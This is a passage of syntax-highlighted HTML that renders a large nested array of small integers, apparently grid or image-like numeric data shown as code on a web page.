class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>], [<span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>], [<span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">16</span>], [<span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">4</span>, <span 